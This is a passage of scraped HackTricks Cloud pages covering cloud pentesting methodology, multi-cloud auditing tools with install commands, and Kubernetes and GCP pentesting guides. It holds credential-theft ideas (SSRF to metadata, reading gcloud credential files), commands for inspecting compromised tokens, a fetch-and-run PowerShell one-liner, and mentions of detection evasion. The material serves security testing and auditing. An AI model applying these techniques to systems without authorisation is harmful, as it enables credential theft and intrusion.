        "text": "TODO\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nGithub PRs are welcome explaining how to (ab)use those platforms from an attacker perspective\nDrone\nTeamCity\nBuildKite\nOctopusDeploy\nRancher\nMesosphere\nRadicle\nAny other CI/CD platform...\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting CI/CD -\nPrevious\nAnsible Tower / AWX / Automation controller Security\nNext\n- Pentesting Cloud\nPentesting Cloud Methodology\nLast modified\n5mo ago"
    },
    {
        "title": "Pentesting Cloud Methodology",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology",
        "text": "Pentesting Cloud Methodology\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Methodology\nEach cloud has its own peculiarities but in general there are a few\ncommon things a pentester should check\nwhen testing a cloud environment:\nBenchmark checks\nThis will help you\nunderstand the size\nof the environment and\nservices used\nIt will allow you also to find some\nquick misconfigurations\nas you can perform most of this tests with\nautomated tools\nServices Enumeration\nYou probably won't find much more misconfigurations here if you performed correctly the benchmark tests, but you might find some that weren't being looked for in the benchmark test.\nThis will allow you to know\nwhat is exactly being used\nin the cloud env\nThis will help a lot in the next steps\nCheck exposed assets\nThis can be done during the previous section, you need to\nfind out everything that is potentially exposed\nto the Internet somehow and how can it be accessed.\nHere I'm taking\nmanually exposed infrastructure\nlike instances with web pages or other ports being exposed, and also about other\ncloud managed services that can be configured\nto be exposed (such as DBs or buckets)\nThen you should check\nif that resource can be exposed or not\n(confidential information? vulnerabilities? misconfigurations in the exposed service?)\nCheck permissions\nHere you should\nfind out all the permissions of each role/user\ninside the cloud and how are they used\nToo\nmany highly privileged\n(control everything) accounts? Generated keys not used?... Most of these check should have been done in the benchmark tests already\nIf the client is using OpenID or SAML or other\nfederation\nyou might need to ask them for further\ninformation\nabout\nhow is being each role assigned\n(it's not the same that the admin role is assigned to 1 user or to 100)\nIt's\nnot enough to find\nwhich users has\nadmin\npermissions \"*:*\". There are a lot of\nother permissions\nthat depending on the services used can be very\nsensitive\n.\nMoreover, there are\npotential privesc\nways to follow abusing permissions. All this things should be taken into account and\nas much privesc paths as possible\nshould be reported.\nCheck Integrations\nIt's highly probably that\nintegrations with other clouds or SaaS\nare being used inside the cloud env.\nFor\nintegrations of the cloud you are auditing\nwith other platform you should notify\nwho has access to (ab)use that integration\nand you should ask\nhow sensitive\nis the action being performed.\nFor example, who can write in an AWS bucket where GCP is getting data from (ask how sensitive is the action in GCP treating that data).\nFor\nintegrations inside the cloud you are auditing\nfrom external platforms, you should ask\nwho has access externally to (ab)use that integration\nand check how is that data being used.\nFor example, if a service is using a Docker image hosted in GCR, you should ask who has access to modify that and which sensitive info and access will get that image when executed inside an AWS cloud.\nMulti-Cloud tools\nThere are several tools that can be used to test different cloud environments. The installation steps and links are going to be indicated in this section.\n​\nPurplePanda\n​\nA tool to\nidentify bad configurations and privesc path in clouds and across clouds/SaaS.\nInstall\nGCP\n# You need to install and run neo4j also\ngit\nclone https://github.com/carlospolop/PurplePanda\ncd\nPurplePanda\npython3\n-m\nvenv\n.\nsource\nbin/activate\npython3\n-m\npip\ninstall\n-r\nrequirements.txt\nexport\nPURPLEPANDA_NEO4J_URL\n=\n\"bolt://neo4j@localhost:7687\"\nexport\nPURPLEPANDA_PWD\n=\n\"neo4j_pwd_4_purplepanda\"\npython3 main.py\n-h\n# Get help\nexport\nGOOGLE_DISCOVERY\n=\n$(\necho\n'google:\n- file_path: \"\"\n​\n- file_path: \"\"\nservice_account_id: \"\n[email protected]\n\"'\n|\nbase64\n)\n​\npython3 main.py\n-a\n-p\ngoogle\n#Get basic info of the account to check it's correctly configured\npython3 main.py\n-e\n-p\ngoogle\n#Enumerate the env\n​\nProwler\n​\nIt supports\nAWS, GCP & Azure\n. Check how to configure each provider in\nhttps://docs.prowler.cloud/en/latest/#aws\n​\n# Install\npip\ninstall\nprowler\nprowler\n-v\n​\n# Run\nprowler\n<\nprovider\n>\n# Example\nprowler aws\n--profile\ncustom-profile\n[\n-M csv json json-asff html\n]\n​\n# Get info about checks & services\nprowler\n<\nprovider\n>\n--list-checks\nprowler\n<\nprovider\n>\n--list-services\n​\nCloudSploit\n​\nAWS, Azure, Github, Google, Oracle, Alibaba\nInstall\nGCP\n# Install\ngit\nclone https://github.com/aquasecurity/cloudsploit.git\ncd\ncloudsploit\nnpm\ninstall\n./index.js\n-h\n## Docker instructions in github\n## You need to have creds for a service account and set them in config.js file\n./index.js\n--cloud\ngoogle\n--config\n<\n/abs/path/to/config.js\n>\n​\nScoutSuite\n​\nAWS, Azure, GCP, Alibaba Cloud, Oracle Cloud Infrastructure\nInstall\nGCP\nmkdir\nscout\n;\ncd\nscout\nvirtualenv\n-p\npython3 venv\nsource\nvenv/bin/activate\npip\ninstall\nscoutsuite\nscout\n--help\n## Using Docker: https://github.com/nccgroup/ScoutSuite/wiki/Docker-Image\nscout gcp --report-dir /tmp/gcp --user-account --all-projects\n## use \"--service-account KEY_FILE\" instead of \"--user-account\" to use a service account\n​\nSCOUT_FOLDER_REPORT\n=\n\"/tmp\"\nfor\npid\nin\n$(\ngcloud projects list\n--format\n=\n\"value(projectId)\"\n)\n;\ndo\necho\n\"================================================\"\necho\n\"Checking\n$pid\n\"\nmkdir\n\"\n$SCOUT_FOLDER_REPORT\n/\n$pid\n\"\nscout gcp --report-dir\n\"\n$SCOUT_FOLDER_REPORT\n/\n$pid\n\"\n--no-browser --user-account --project-id\n\"\n$pid\n\"\ndone\n​\nSteampipe\n​\nInstall\nGCP\nAWS\nDownload and install Steampipe (\nhttps://steampipe.io/downloads\n). Or use Brew:\nbrew tap turbot/tap\nbrew install steampipe\n# Install gcp plugin\nsteampipe plugin\ninstall\ngcp\n​\n# Use https://github.com/turbot/steampipe-mod-gcp-compliance.git\ngit\nclone https://github.com/turbot/steampipe-mod-gcp-compliance.git\ncd\nsteampipe-mod-gcp-compliance\n# To run all the checks from the dashboard\nsteampipe dashboard\n# To run all the checks from rhe cli\nsteampipe check all\nCheck all Projects\nIn order to check all the projects you need to generate the\ngcp.spc\nfile indicating all the projects to test. You can just follow the indications from the following script\nFILEPATH\n=\n\"/tmp/gcp.spc\"\nrm\n-rf\n\"\n$FILEPATH\n\"\n2\n>\n/dev/null\n​\n# Generate a json like object for each project\nfor\npid\nin\n$(\ngcloud projects list\n--format\n=\n\"value(projectId)\"\n)\n;\ndo\necho\n\"connection\n\\\"\ngcp_\n$(\necho\n-n\n$pid\n|\ntr\n\"-\"\n\"_\"\n)\n\\\"\n{\nplugin  =\n\\\"\ngcp\n\\\"\nproject =\n\\\"\n$pid\n\\\"\n}\"\n>>\n\"\n$FILEPATH\n\"\ndone\n​\n# Generate the aggragator to call\necho\n'connection \"gcp_all\" {\nplugin      = \"gcp\"\ntype        = \"aggregator\"\nconnections = [\"gcp_*\"]\n}'\n>>\n\"\n$FILEPATH\n\"\n​\necho\n\"Copy\n$FILEPATH\nin ~/.steampipe/config/gcp.spc if it was correctly generated\"\nTo check\nother GCP insights\n(useful for enumerating services) use:\nhttps://github.com/turbot/steampipe-mod-gcp-insights\n​\nTo check Terraform GCP code:\nhttps://github.com/turbot/steampipe-mod-terraform-gcp-compliance\n​\nMore GCP plugins of Steampipe:\nhttps://github.com/turbot?q=gcp\n​\n# Install aws plugin\nsteampipe plugin\ninstall\naws\n​\n# Modify the spec indicating in \"profile\" the profile name to use\nnano\n~/.steampipe/config/aws.spc\n​\n# Get some info on how the AWS account is being used\ngit\nclone https://github.com/turbot/steampipe-mod-aws-insights.git\ncd\nsteampipe-mod-aws-insights\nsteampipe dashboard\n​\n# Get the services exposed to the internet\ngit\nclone https://github.com/turbot/steampipe-mod-aws-perimeter.git\ncd\nsteampipe-mod-aws-perimeter\nsteampipe dashboard\n​\n# Run the benchmarks\ngit\nclone https://github.com/turbot/steampipe-mod-aws-compliance\ncd\nsteampipe-mod-aws-compliance\nsteampipe dashboard\n# To see results in browser\nsteampipe check all\n--export\n=\n/tmp/output4.json\nTo check Terraform AWS code:\nhttps://github.com/turbot/steampipe-mod-terraform-aws-compliance\n​\nMore AWS plugins of Steampipe:\nhttps://github.com/orgs/turbot/repositories?q=aws\n​\n​\ncs-suite\n​\nAWS, GCP, Azure, DigitalOcean.\nIt requires python2.7 and looks unmaintained.\nNessus\nNessus has an\nAudit Cloud Infrastructure\nscan supporting: AWS, Azure, Office 365, Rackspace, Salesforce. Some extra configurations in\nAzure\nare needed to obtain a\nClient Id\n.\n​\ncloudlist\n​\nCloudlist is a\nmulti-cloud tool for getting Assets\n(Hostnames, IP Addresses) from Cloud Providers.\nCloudlist\nSecond Tab\ncd\n/tmp\nwget\nhttps://github.com/projectdiscovery/cloudlist/releases/latest/download/cloudlist_1.0.1_macOS_arm64.zip\nunzip\ncloudlist_1.0.1_macOS_arm64.zip\nchmod\n+x cloudlist\nsudo\nmv\ncloudlist /usr/local/bin\n## For GCP it requires service account JSON credentials\ncloudlist\n-config\n<\n/path/to/config\n>\n​\ncartography\n​\nCartography is a Python tool that consolidates infrastructure assets and the relationships between them in an intuitive graph view powered by a Neo4j database.\nInstall\nGCP\n# Installation\ndocker\nimage pull ghcr.io/lyft/cartography\ndocker\nrun\n--platform\nlinux/amd64 ghcr.io/lyft/cartography cartography\n--help\n## Install a Neo4j DB version 3.5.*\ndocker\nrun\n--platform\nlinux/amd64\n\\\n--volume\n\"\n$HOME\n/.config/gcloud/application_default_credentials.json:/application_default_credentials.json\"\n\\\n-e\nGOOGLE_APPLICATION_CREDENTIALS\n=\n\"/application_default_credentials.json\"\n\\\n-e\nNEO4j_PASSWORD\n=\n\"s3cr3t\"\n\\\nghcr.io/lyft/cartography\n\\\n--neo4j-uri bolt://host.docker.internal:7687\n\\\n--neo4j-password-env-var NEO4j_PASSWORD\n\\\n--neo4j-user neo4j\n​\n​\n# It only checks for a few services inside GCP (https://lyft.github.io/cartography/modules/gcp/index.html)\n## Cloud Resource Manager\n## Compute\n## DNS\n## Storage\n## Google Kubernetes Engine\n### If you can run starbase or purplepanda you will get more info\n​\nstarbase\n​\nStarbase collects assets and relationships from services and systems including cloud infrastructure, SaaS applications, security controls, and more into an intuitive graph view backed by the Neo4j database.\nInstall\nGCP\n# You are going to need Node version 14, so install nvm following https://tecadmin.net/install-nvm-macos-with-homebrew/\nnpm\ninstall\n--global\nyarn\nnvm\ninstall\n14\ngit\nclone https://github.com/JupiterOne/starbase.git\ncd\nstarbase\nnvm use\n14\nyarn\ninstall\nyarn\nstarbase\n--help\n# Configure manually config.yaml depending on the env to analyze\nyarn\nstarbase setup\nyarn\nstarbase run\n​\n# Docker\ngit\nclone https://github.com/JupiterOne/starbase.git\ncd\nstarbase\ncp\nconfig.yaml.example config.yaml\n# Configure manually config.yaml depending on the env to analyze\ndocker\nbuild --no-cache\n-t\nstarbase:latest\n.\ndocker-compose\nrun starbase setup\ndocker-compose\nrun starbase run\n## Config for GCP\n### Check out: https://github.com/JupiterOne/graph-google-cloud/blob/main/docs/development.md\n### It requires service account credentials\nintegrations\n:\n-\nname\n:\ngraph\n-\ngoogle\n-\ncloud\ninstanceId\n:\ntestInstanceId\ndirectory\n:\n./.integrations/graph\n-\ngoogle\n-\ncloud\ngitRemoteUrl\n:\nhttps\n:\n//github.com/JupiterOne/graph\n-\ngoogle\n-\ncloud.git\nconfig\n:\nSERVICE_ACCOUNT_KEY_FILE\n:\n'{Check https://github.com/JupiterOne/graph-google-cloud/blob/main/docs/development.md#service_account_key_file-string}'\nPROJECT_ID\n:\n\"\"\nFOLDER_ID\n:\n\"\"\nORGANIZATION_ID\n:\n\"\"\nCONFIGURE_ORGANIZATION_PROJECTS\n:\nfalse\n​\nstorage\n:\nengine\n:\nneo4j\nconfig\n:\nusername\n:\nneo4j\npassword\n:\ns3cr3t\nuri\n:\nbolt\n:\n//localhost\n:\n7687\n#Consider using host.docker.internal if from docker\n​\nSkyArk\n​\nDiscover the most privileged users in the scanned AWS or Azure environment, including the AWS Shadow Admins. It uses powershell.\nImport-Module\n.\n\\SkyArk\n.\nps1\n-\nforce\nStart-AzureStealth\n​\n# in the Cloud Console\nIEX\n(\nNew-Object\nNet\n.\nWebClient\n).\nDownloadString\n(\n'https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1'\n)\nScan-AzureAdmins\n​\nCloud Brute\n​\nA tool to find a company (target) infrastructure, files, and apps on the top cloud providers (Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, Linode).\n​\nCloudFox\n​\nCloudFox is a tool to find exploitable attack paths in cloud infrastructure (currently only AWS & Azure supported with GCP upcoming).\nIt is an enumeration tool which is intended to compliment manual pentesting.\nIt doesn't create or modify any data within the cloud environment.\nMore lists of cloud security tools\n​\nhttps://github.com/RyanJarv/awesome-cloud-sec\n​\nGoogle\nGCP\nGCP Pentesting\nWorkspace\nWorkspace Pentesting\nAWS\nAWS Pentesting\nAzure\nAccess the portal here:\nhttp://portal.azure.com/\nTo start the tests you should have access with a user with\nReader permissions over the subscription\nand\nGlobal Reader role in AzureAD\n. If even in that case you are\nnot able to access the content of the Storage accounts\nyou can fix it with the\nrole Storage Account Contributor\n.\nIt is recommended to\ninstall azure-cli\nin a\nlinux\nand\nwindows\nvirtual machines (to be able to run powershell and python scripts):\nhttps://docs.microsoft.com/en-us/cli/azure/install-azure-cli?view=azure-cli-latest\nThen, run\naz login\nto login. Note the\naccount information\nand\ntoken\nwill be\nsaved\ninside\n<HOME>/.azure\n(in both Windows and Linux).\nRemember that if the\nSecurity Centre Standard Pricing Tier\nis being used and\nnot\nthe\nfree\ntier, you can\ngenerate\na\nCIS compliance scan report\nfrom the azure portal. Go to\nPolicy & Compliance-> Regulatory Compliance\n(or try to access\nhttps://portal.azure.com/#blade/Microsoft_Azure_Security/SecurityMenuBlade/22\n).\n__If the company is not paying for a Standard account you may need to review the\nCIS Microsoft Azure Foundations Benchmark\nby \"hand\" (you can get some help using the following tools). Download it from\nhere\n.\nRun scanners\nRun the scanners to look for\nvulnerabilities\nand\ncompare\nthe security measures implemented with\nCIS\n.\npip\ninstall\nscout\nscout azure\n--cli\n--report-dir\n<\noutput_dir\n>\n​\n#Fix azureaudit.py before launching cs.py\n#Adding \"j_res = {}\" on line 1074\npython cs.py\n-env\nazure\n​\n#Azucar is an Azure security scanner for PowerShell (https://github.com/nccgroup/azucar)\n#Run it from its folder\n.\n\\\nAzucar.ps1\n-AuthMode\nInteractive\n-ForceAuth\n-ExportTo\nEXCEL\n​\n#Azure-CIS-Scanner,CIS scanner for Azure (https://github.com/kbroughton/azure_cis_scanner)\npip3\ninstall\nazure-cis-scanner\n#Install\nazscan\n#Run, login before with `az login`\nAttack Graph\n​\nStormspotter\ncreates an “attack graph” of the resources in an Azure subscription. It enables red teams and pentesters to visualize the attack surface and pivot opportunities within a tenant, and supercharges your defenders to quickly orient and prioritize incident response work.\nMore checks\nCheck for a\nhigh number of Global Admin\n(between 2-4 are recommended). Access it on:\nhttps://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Overview\n​\nGlobal admins should have MFA activated. Go to Users and click on Multi-Factor Authentication button.\nDedicated admin account shouldn't have mailboxes (they can only have mailboxes if they have Office 365).\nLocal AD shouldn't be sync with Azure AD if not needed(\nhttps://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/AzureADConnect\n). And if synced Password Hash Sync should be enabled for reliability. In this case it's disabled:\nGlobal Administrators\nshouldn't be synced from a local AD. Check if Global Administrators emails uses the domain\nonmicrosoft.com\n. If not, check the source of the user, the source should be Azure Active Directory, if it comes from Windows Server AD, then report it.\nStandard tier\nis recommended instead of free tier (see the tier being used in\nPricing & Settings\nor in\nhttps://portal.azure.com/#blade/Microsoft_Azure_Security/SecurityMenuBlade/24\n)\nPeriodic SQL servers scans\n:\nSelect the SQL server\n-->\nMake sure that 'Advanced data security' is set to 'On'\n-->\nUnder 'Vulnerability assessment settings', set 'Periodic recurring scans' to 'On', and configure a storage account for storing vulnerability assessment scan results\n-->\nClick Save\nLack of App Services restrictions\n: Look for \"App Services\" in Azure (\nhttps://portal.azure.com/#blade/HubsExtension/BrowseResource/resourceType/Microsoft.Web%2Fsites\n) and check if anyone is being used. In that case check go through each App checking for \"Access Restrictions\" and there aren't rules, report it. The access to the app service should be restricted according to the needs.\nOffice365\nYou need\nGlobal Admin\nor at least\nGlobal Admin Reader\n(but note that Global Admin Reader is a little bit limited). However, those limitations appear in some PS modules and can be bypassed accessing the features\nvia the web application\n.\nOther Cloud Pentesting Guides\n​\nhttps://hackingthe.cloud\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting CI/CD -\nPrevious\nTODO\nNext\n- Pentesting Cloud\nKubernetes Pentesting\nLast modified\n2mo ago"
    },
    {
        "title": "Kubernetes Pentesting",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security",
        "text": "Kubernetes Pentesting\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nKubernetes Basics\nIf you don't know anything about Kubernetes this is a\ngood start\n. Read it to learn about the\narchitecture, components and basic actions\nin Kubernetes:\nKubernetes Basics\nLabs to practice and learn\n​\nhttps://securekubernetes.com/\n​\n​\nhttps://madhuakula.com/kubernetes-goat/index.html\n​\nHardening Kubernetes / Automatic Tools\nKubernetes Hardening\nManual Kubernetes Pentest\nFrom the Outside\nThere are several possible\nKubernetes services that you could find exposed\non the Internet (or inside internal networks). If you find them you know there is Kubernetes environment in there.\nDepending on the configuration and your privileges you might be able to abuse that environment, for more information:\nPentesting Kubernetes Services\nEnumeration inside a Pod\nIf you manage to\ncompromise a Pod\nread the following page to learn how to enumerate and try to\nescalate privileges/escape\n:\nAttacking Kubernetes from inside a Pod\nEnumerating Kubernetes with Credentials\nYou might have managed to compromise\nuser credentials, a user token or some service account toke\nn. You can use it to talk to the Kubernetes API service and try to\nenumerate it to learn more\nabout it:\nKubernetes Enumeration\nAnother important details about enumeration and Kubernetes permissions abuse is the\nKubernetes Role-Based Access Control (RBAC)\n. If you want to abuse permissions, you first should read about it here:\nKubernetes Role-Based Access Control(RBAC)\nKnowing about RBAC and having enumerated the environment you can now try to abuse the permissions with:\nAbusing Roles/ClusterRoles in Kubernetes\nPrivesc to a different Namespace\nIf you have compromised a namespace you can potentially escape to other namespaces with more interesting permissions/resources:\nKubernetes Namespace Escalation\nFrom Kubernetes to the Cloud\nIf you have compromised a K8s account or a pod, you might be able able to move to other clouds. This is because in clouds like AWS or GCP is possible to\ngive a K8s SA permissions over the cloud\n.\nKubernetes Pivoting to Clouds\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting Cloud -\nPrevious\nPentesting Cloud Methodology\nNext\nKubernetes Basics\nLast modified\n3mo ago"
    },
    {
        "title": "GCP Pentesting",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security",
        "text": "GCP Pentesting\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\nBefore start pentesting\na\nGCP\nenvironment, there are a few\nbasics things you need to know\nabout how it works to help you understand what you need to do, how to find misconfigurations and how to exploit them.\nConcepts such as\norganization\nhierarchy,\npermissions\nand other basic concepts are explained in:\nGCP - Basic Information\nLabs to learn\n​\nhttps://gcpgoat.joshuajebaraj.com/\n​\n​\nhttps://github.com/ine-labs/GCPGoat\n​\n​\nhttps://github.com/lacioffi/GCP-pentest-lab/\n​\n​\nhttps://github.com/carlospolop/gcp_privesc_scripts\n​\nGCP Pentester/Red Team Methodology\nIn order to audit a GCP environment it's very important to know: which\nservices are being used\n, what is\nbeing exposed\n, who has\naccess\nto what, and how are internal GCP services an\nexternal services\nconnected.\nFrom a Red Team point of view, the\nfirst step to compromise a GCP environment\nis to manage to obtain some\ncredentials\n. Here you have some ideas on how to do that:\nLeaks\nin github (or similar) - OSINT\nSocial\nEngineering (Check the page\nWorkspace Security\n)\nPassword\nreuse (password leaks)\nVulnerabilities in GCP-Hosted Applications\n​\nServer Side Request Forgery\nwith access to metadata endpoint\nLocal File Read\n/home/USERNAME/.config/gcloud/*\nC:\\Users\\USERNAME\\.config\\gcloud\\*\n3rd parties\nbreached\nInternal\nEmployee\nOr by\ncompromising an unauthenticated service\nexposed:\nGCP - Unauthenticated Enum\nOr if you are doing a\nreview\nyou could just\nask for credentials\nwith these roles:\nGCP - Permissions for a Pentest\nAfter you have managed to obtain credentials, you need to know\nto who do those creds belong\n, and\nwhat they have access to\n, so you need to perform some basic enumeration:\nBasic Enumeration\nSSRF\nFor more information about how to\nenumerate GCP metadata\ncheck the following hacktricks page:\nCloud SSRF\nHackTricks\nWhoami\nIn GCP you can try several options to try to guess who you are:\n#If you are inside a compromise machine\ngcloud auth list\ncurl\n-H\n\"Content-Type: application/x-www-form-urlencoded\"\n-d\n\"access_token=\n$(\ngcloud auth print-access-token\n)\n\"\nhttps://www.googleapis.com/oauth2/v1/tokeninfo\ngcloud auth print-identity-token\n#Get info from the token\n​\n#If you compromised a metadata token or somehow found an OAuth token\ncurl\n-H\n\"Content-Type: application/x-www-form-urlencoded\"\n-d\n\"access_token=<token>\"\nhttps://www.googleapis.com/oauth2/v1/tokeninfo\nOrg Enumeration\n# Get organizations\ngcloud organizations list\n#The DIRECTORY_CUSTOMER_ID is the Workspace ID\ngcloud resource-manager folders list\n--organization\n<\norg_number\n>\n# Get folders\ngcloud projects list\n# Get projects\nPrincipals & IAM Enumeration\nIf you have enough permissions,\nchecking the privileges of each entity inside the GCP account\nwill help you understand what you and other identities can do and how to\nescalate privileges\n.\nIf you don't have enough permissions to enumerate IAM, you can\nsteal brute-force them\nto figure them out.\nCheck\nhow to do the numeration and brute-forcing\nin:\nGCP - IAM, Ppals & Org Policies Enum\nNow that you\nhave some information about your credentials\n(and if you are a red team hopefully you\nhaven't been detected\n). It's time to figure out which services are being used in the environment.\nIn the following section you can check some ways to\nenumerate some common services.\nServices Enumeration, Post-Exploitation & Persistence\nGCP has an astonishing amount of services, in the following page you will find\nbasic information, enumeration\ncheatsheets, how to\navoid detection\n, obtain\npersistence\n, and other\npost-exploitation\ntricks about some of them:\nGCP - Services\nGCP - Non-svc Persistance\nNote that you\ndon't\nneed to perform all the work\nmanually\n, below in this post you can find a\nsection about\nautomatic tools\n.\nMoreover, in this stage you might discovered\nmore services exposed to unauthenticated users,\nyou might be able to exploit them:\nGCP - Unauthenticated Enum\nPrivilege Escalation\nThe most common way once you have obtained some cloud credentials or have compromised some service running inside a cloud is to\nabuse misconfigured privileges\nthe compromised account may have. So, the first thing you should do is to enumerate your privileges.\nMoreover, during this enumeration, remember that\npermissions can be set at the highest level of \"Organization\"\nas well.\nGCP - Privilege Escalation\nPublicly Exposed Services\nWhile enumerating GCP services you might have found some of them\nexposing elements to the Internet\n(VM/Containers ports, databases or queue services, snapshots or buckets...).\nAs pentester/red teamer you should always check if you can find\nsensitive information / vulnerabilities\non them as they might provide you\nfurther access into the AWS account\n.\nIn this book you should find\ninformation\nabout how to find\nexposed AWS services and how to check them\n. About how to find\nvulnerabilities in exposed network services\nI would recommend you to\nsearch\nfor the specific\nservice\nin:\nHackTricks\nHackTricks\nAutomatic Tools\nIn the\nGCloud console\n, in\nhttps://console.cloud.google.com/iam-admin/asset-inventory/dashboard\nyou can see resources and IAMs being used by project.\nHere you can see the assets supported by this API:\nhttps://cloud.google.com/asset-inventory/docs/supported-asset-types\n​\nCheck\ntools\nthat can be\nused in several clouds here\n.\n​\ngcp_scanner\n: This is a GCP resource scanner that can help determine what\nlevel of access certain credentials posses\non GCP.\n# Install\ngit\nclone https://github.com/google/gcp_scanner.git\ncd\ngcp_scanner\nvirtualenv\n-p\npython3 venv\nsource\nvenv/bin/activate\npip\ninstall\n-r\nrequirements.txt\n# Execute with gcloud creds\npython3 __main__.py\n-o\n/tmp/output/\n-g\n\"\n$HOME\n/.config/gcloud\"\n​\ngcp_enum\n: Bash script to enumerate a GCP environment using gcloud cli and saving the results in a file.\n​\nGCP-IAM-Privilege-Escalation\n: Scripts to enumerate high IAM privileges and to escalate privileges in GCP abusing them (I couldn’t make run the enumerate script).\ngcloud config & debug\n# Login so gcloud can use your credentials\ngcloud auth login\ngcloud config\nset\nproject security-devbox\ngcloud auth print-access-token\n​\n# Login so SDKs can use your user credentials\ngcloud auth application-default login\ngcloud auth application-default set-quota-project security-devbox\ngcloud auth application-default print-access-token\n​\n# Update gcloud\ngcloud components update\nCapture gcloud, gsutil... network\nRemember that you can use the\nparameter\n--log-http\nwith the\ngcloud\ncli to\nprint\nthe\nrequests\nthe tool is performing. If you don't want the logs to redact the token value use\ngcloud config set log_http_redact_token false\nMoreover, to intercept the communication:\ngcloud config\nset\nproxy/address\n127.0\n.0.1\ngcloud config\nset\nproxy/port\n8080\ngcloud config\nset\nproxy/type http\ngcloud config\nset\nauth/disable_ssl_validation True\n​\n# If you don't want to completely disable ssl_validation use:\ngcloud config\nset\ncore/custom_ca_certs_file cert.pem\n​\n# Back to normal\ngcloud config\nunset\nproxy/address\ngcloud config\nunset\nproxy/port\ngcloud config\nunset\nproxy/type\ngcloud config\nunset\nauth/disable_ssl_validation\ngcloud config\nunset\ncore/custom_ca_certs_file\nReferences\n​\nhttps://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nMonitoring with Falco\nNext\nGCP - Basic Information\nLast modified\n2mo ago"
    },
    {
        "title": "Workspace Pentesting",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/workspace-security",
